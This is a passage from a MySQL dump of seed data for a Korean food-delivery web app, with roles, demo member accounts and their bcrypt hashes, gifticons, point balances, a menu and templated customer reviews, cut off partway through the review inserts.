
-- 테이블 데이터 baedalbujok.role:~3 rows (대략적) 내보내기
/*!40000 ALTER TABLE `role` DISABLE KEYS */;
INSERT IGNORE INTO `role` (`id`, `name`, `created_date`, `updated_date`) VALUES
	('ADMIN', '관리자', '2023-05-24 00:36:56', '2023-05-24 00:36:56'),
	('BOSS', '사장님', '2023-05-24 00:36:56', '2023-05-24 00:36:56'),
	('USER', '사용자', '2023-05-24 00:36:56', '2023-05-24 00:36:56');
/*!40000 ALTER TABLE `role` ENABLE KEYS */;


-- 테이블 데이터 baedalbujok.member:~9 rows (대략적) 내보내기
/*!40000 ALTER TABLE `member` DISABLE KEYS */;
INSERT IGNORE INTO `member` (`id`, `username`, `password`, `name`, `role_id`, `created_date`, `updated_date`) VALUES
	(7, 'admin', '$2a$10$Tt0puHrQ0V82Oa8eZEmyt.7jK8fjth/5XXTIBbs50uO13oESgIKK2', '관리자', 'ADMIN', '2023-06-05 21:30:34', '2023-06-05 21:30:34'),
	(8, 'boss', '$2a$10$RTjF9l1Keh9PZzD94GZnNeoZelWh1E5SBTnqfsvMWL.aIx9Ze85Sa', '배달왕', 'BOSS', '2023-06-05 21:31:33', '2023-06-05 21:32:48'),
	(9, 'hacker', '$2a$10$Iuia.Mhwve.J1UyAFCCkU.ZvoTjospZaQFVYgEXv.83RCFP2wN9/e', '해커', 'USER', '2023-06-05 21:33:10', '2023-06-05 21:33:10'),
	(10, 'user1', '$2a$10$8fC2zuhnQy/fgpk/h0MxK.YeJkZ7/Pk9/WzbNWno5AW5/.Wkq5d9i', '배고픈 홍길동', 'USER', '2023-06-05 22:18:04', '2023-06-05 22:18:04'),
	(11, 'user2', '$2a$10$oZugVQdtmcFfSCfHWd1BLejPkC3N03sh8NJe9VNufWvenzemmzC7u', '힘쎈사람', 'USER', '2023-06-05 22:18:45', '2023-06-05 22:18:45'),
	(12, 'user3', '$2a$10$SG./WhIcyInsz0KkGCSpw.pyEupbTe3qw3UPRt/ryFdxfof23Yfd6', '영리한학자', 'USER', '2023-06-05 22:19:01', '2023-06-05 22:19:01'),
	(13, 'user4', '$2a$10$kKfj3Dfd19RI5tYkEo53Put.y2HG.AwRGpY4rG99bw30IbRO96aUe', '슬픈공룡', 'USER', '2023-06-05 22:19:24', '2023-06-05 22:19:24'),
	(14, 'user5', '$2a$10$n4w125RNGuok.Do2Ll73c.CzNT3Zu5IcDyGFNOLUhJ/eijkEeQepK', '우왕', 'USER', '2023-06-05 22:19:39', '2023-06-05 22:19:39'),
	(15, 'user6', '$2a$10$UNDeOEgHgClTSo1gyzbaZOZjmuNsHGz0tVnG0Xi8bIn.35wx3v02u', '고독한미식가', 'USER', '2023-06-05 22:20:09', '2023-06-05 22:20:09');
/*!40000 ALTER TABLE `member` ENABLE KEYS */;


-- 테이블 데이터 baedalbujok.gifticon:~10 rows (대략적) 내보내기
/*!40000 ALTER TABLE `gifticon` DISABLE KEYS */;
INSERT IGNORE INTO `gifticon` (`id`, `amount`, `use`, `use_member_id`, `serial_number`, `created_date`, `updated_date`) VALUES
	(1, 50000, '1', 9, 'E746E5B2449A', '2023-06-05 23:27:33', '2023-06-05 23:27:33'),
	(2, 50000, '1', 9, 'D3FEC50A8DB9', '2023-06-05 23:27:34', '2023-06-05 23:27:34'),
	(3, 50000, '1', 9, '45C46C31981F', '2023-06-05 23:27:35', '2023-06-05 23:27:35'),
	(4, 50000, '1', 9, '950D47E9F503', '2023-06-05 23:27:36', '2023-06-05 23:27:36'),
	(5, 50000, '0', NULL, '848E5374E294', '2023-06-05 23:27:38', '2023-06-05 23:27:38'),
	(6, 50000, '0', NULL, 'CFD0538D0D88', '2023-06-05 23:27:38', '2023-06-05 23:27:38'),
	(7, 50000, '0', NULL, '379015638CE1', '2023-06-05 23:27:39', '2023-06-05 23:27:39'),
	(8, 50000, '0', NULL, '320D17490F56', '2023-06-05 23:27:40', '2023-06-05 23:27:40'),
	(9, 50000, '0', NULL, '289CF2E56698', '2023-06-05 23:27:41', '2023-06-05 23:27:41'),
	(10, 50000, '0', NULL, 'F0DF38FA33DD', '2023-06-05 23:27:41', '2023-06-05 23:27:41');
/*!40000 ALTER TABLE `gifticon` ENABLE KEYS */;


-- 테이블 데이터 baedalbujok.point:~9 rows (대략적) 내보내기
/*!40000 ALTER TABLE `point` DISABLE KEYS */;
INSERT IGNORE INTO `point` (`id`, `member_id`, `balance`, `created_date`, `updated_date`) VALUES
	(6, 7, 100000, '2023-06-05 21:30:34', '2023-06-05 21:30:34'),
	(7, 8, 100000, '2023-06-05 21:31:33', '2023-06-05 21:31:33'),
	(8, 9, 100000, '2023-06-05 21:33:10', '2023-06-05 21:33:10'),
	(9, 10, 300000, '2023-06-05 22:18:04', '2023-06-05 23:49:15'),
	(10, 11, 100000, '2023-06-05 22:18:45', '2023-06-05 22:18:45'),
	(11, 12, 100000, '2023-06-05 22:19:01', '2023-06-05 22:19:01'),
	(12, 13, 100000, '2023-06-05 22:19:24', '2023-06-05 22:19:24'),
	(13, 14, 100000, '2023-06-05 22:19:39', '2023-06-05 22:19:39'),
	(14, 15, 100000, '2023-06-05 22:20:09', '2023-06-05 22:20:09');
/*!40000 ALTER TABLE `point` ENABLE KEYS */;


-- 테이블 데이터 baedalbujok.menu:~12 rows (대략적) 내보내기
/*!40000 ALTER TABLE `menu` DISABLE KEYS */;
INSERT IGNORE INTO `menu` (`id`, `name`, `price`, `desc`, `created_date`, `updated_date`, `image_name`, `member_id`, `delete`) VALUES
	(11, '떡볶이', 18000, '매콤하면서도 맛있는 국민 메뉴 떡볶이!', '2023-06-05 21:33:46', '2023-06-05 21:33:46', '떡볶이.jpeg', 8, '0'),
	(12, '마라탕', 10000, '31가지 싱싱한 채소와 함께 매콤 얼큰한 사골 베이스 국물의 콜라보레이션!', '2023-06-05 21:36:24', '2023-06-05 21:36:24', '마라탕.jpeg', 8, '0'),
	(13, '보쌈', 35000, '너무 맛있는 보쌈', '2023-06-05 21:36:41', '2023-06-05 21:55:03', '보쌈.jpeg', 8, '0'),
	(14, '삼겹살(1kg)', 20000, '조리 전 고기중량 입니다. \r\n(고기 외 구성은 별도로 추가하셔야 합니다)', '2023-06-05 21:38:21', '2023-06-05 21:38:21', '삼겹살.png', 8, '0'),
	(15, '아이스아메리카노', 3000, '시원한 얼음물에 에스프레소 샷을 추가한 아이스 아메리카노!', '2023-06-05 21:38:56', '2023-06-05 21:38:56', '아이스아메리카노.jpeg', 8, '0'),
	(16, '족발', 35000, '신선한 돼지의 앞다리살을 40시간 이상 푹 삶아 부드러운 족발!', '2023-06-05 21:39:43', '2023-06-05 21:39:43', '족발.jpeg', 8, '0'),
	(17, '게살버거', 8000, '스폰지밥이 직접 만든 게살버거!', '2023-06-05 21:40:08', '2023-06-05 21:40:08', 'hamburger-g9779d5131_640.jpg', 8, '0'),
	(18, '피자(L)', 21000, '쫄깃한 도우와 부드러운 모짜렐라 치즈의 만남!', '2023-06-05 21:40:48', '2023-06-05 21:40:48', 'pizza-g4edf253b6_640.jpg', 8, '0'),
	(19, '후라이드치킨', 18000, '40년 전통 시장 스타일의 후라이드 치킨', '2023-06-05 21:41:34', '2023-06-05 21:41:34', 'chicken-g1822f77f8_640.jpg', 8, '0'),
	(20, '탕수육(대)', 18000, '중국음식에 빼 먹을 수 없는 소울푸드! 탕수육\r\n(찍먹은 요청란에 소스를 따로 달라고 하셔야 됩니다. 사장님이 부먹이에요)', '2023-06-05 21:43:48', '2023-06-05 21:43:48', '탕수육.jpeg', 8, '0'),
	(21, '망고빙수', 11000, '상큼한 망고를 올린 시원한 빙수', '2023-06-05 22:06:41', '2023-06-05 22:06:41', '망고빙수.png', 8, '0'),
	(22, '경약식돈까스', 12000, '추억의 경양식돈까스', '2023-06-05 22:13:37', '2023-06-05 22:13:37', '돈까스.jpeg', 8, '0');
/*!40000 ALTER TABLE `menu` ENABLE KEYS */;


-- 테이블 데이터 baedalbujok.review:~1,200 rows (대략적) 내보내기
/*!40000 ALTER TABLE `review` DISABLE KEYS */;
INSERT IGNORE INTO `review` (`id`, `content`, `member_id`, `menu_id`, `evaluation`, `created_date`, `updated_date`, `image_name`) VALUES
	(1, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 13, 20, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(2, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 13, 19, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(3, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(4, '음식이 맛있었고, 서비스도 만족스러웠어요.', 15, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(5, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(6, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 11, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(7, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(8, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(9, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(10, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 11, 18, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(11, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 12, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(12, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 15, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(13, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(14, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 13, 16, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(15, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(16, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 14, 14, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(17, '서비스 태도도 좋았고, 음식도 맛있었어요.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(18, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(19, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(20, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 11, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(21, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(22, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(23, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(24, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(25, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 11, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(26, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 12, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(27, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(28, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 12, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(29, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 12, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(30, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(31, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 10, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(32, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(33, '서비스 태도도 좋았고, 음식도 맛있었어요.', 14, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(34, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 14, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(35, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 13, 11, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(36, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 14, 21, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(37, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(38, '음식의 맛과 가격이 모두 만족스러웠습니다.', 14, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(39, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(40, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 11, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(41, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(42, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 10, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(43, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(44, '최악의 경험. 주문한 음식이 완전히 망가졌어요.', 11, 19, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(45, '음식이 너무 늦게 도착했고, 완전히 차가웠어요.', 11, 14, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(46, '음식은 평범한 수준이었고, 특별한 매력을 느끼지 못했습니다.', 11, 20, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(47, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 12, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(48, '주문한 음식이 전혀 맞지 않았고, 맛도 없었어요.', 13, 20, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(49, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 10, 19, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(50, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(51, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 11, 12, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(52, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(53, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 10, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(54, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(55, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(56, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(57, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(58, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(59, '음식은 그럭저럭 괜찮았지만, 기대한 만큼의 만족은 얻지 못했어요.', 10, 14, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(60, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(61, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 15, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(62, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(63, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(64, '음식이 맛있었고, 서비스도 만족스러웠어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(65, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(66, '음식은 평범했고, 특별한 매력을 찾기 어려웠어요. 다음 번에는 다른 가게를 시도해볼 생각입니다.', 13, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(67, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(68, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(69, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 14, 19, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(70, '음식의 맛은 나쁘지 않았지만, 가격 대비 아쉬웠어요.', 14, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(71, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 15, 22, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(72, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(73, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 10, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(74, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 13, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(75, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(76, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 15, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(77, '주문한 음식이 맛이 없었고, 배달이 매우 느렸어요.', 13, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(78, '음식의 양도 적었고, 맛도 별로였어요.', 13, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(79, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 14, 19, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(80, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(81, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 12, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(82, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(83, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(84, '음식이 맛있었고, 서비스도 만족스러웠어요.', 11, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(85, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(86, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 12, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(87, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 15, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(88, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 14, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(89, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 10, 13, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(90, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(91, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(92, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 13, 17, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(93, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 12, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(94, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 13, 20, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(95, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(96, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(97, '주문한 음식이 맛이 없었고, 배달이 매우 느렸어요.', 10, 21, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(98, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(99, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 15, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(100, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(101, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(102, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(103, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 15, 18, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(104, '음식의 맛과 가격이 모두 만족스러웠습니다.', 14, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(105, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(106, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(107, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(108, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 14, 15, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(109, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(110, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 12, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(111, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(112, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(113, '음식의 맛과 양 모두 만족스러웠습니다.', 14, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(114, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(115, '서비스는 별로였고, 음식의 퀄리티도 아쉬웠어요. 다른 곳에서 시도해볼 만한 가치는 없었습니다.', 14, 15, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(116, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 15, 16, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(117, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 13, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(118, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 13, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(119, '주문한 음식이 맛이 없었고, 배달이 매우 느렸어요.', 13, 18, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(120, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 10, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(121, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(122, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 11, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(123, '전혀 맛이 없었습니다. 돈이 아까웠어요.', 14, 17, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(124, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 11, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(125, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 10, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(126, '음식은 평범한 수준이었고, 특별한 매력을 느끼지 못했습니다.', 11, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
